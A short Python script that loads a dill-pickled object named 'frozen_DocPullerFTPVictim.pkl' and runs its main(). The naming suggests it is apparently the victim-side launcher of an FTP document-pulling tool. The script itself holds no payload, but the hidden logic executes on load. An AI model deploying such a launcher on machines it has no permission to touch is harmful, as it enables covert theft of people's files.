import dill
import DocPullerScripts.DocPullerFTP.victim

if __name__ == '__main__':

    with open('DocPullerFrozenObjects/frozen_DocPullerFTPVictim.pkl', 'rb') as file:
        loaded_obj = dill.load(file)

    loaded_obj.main()
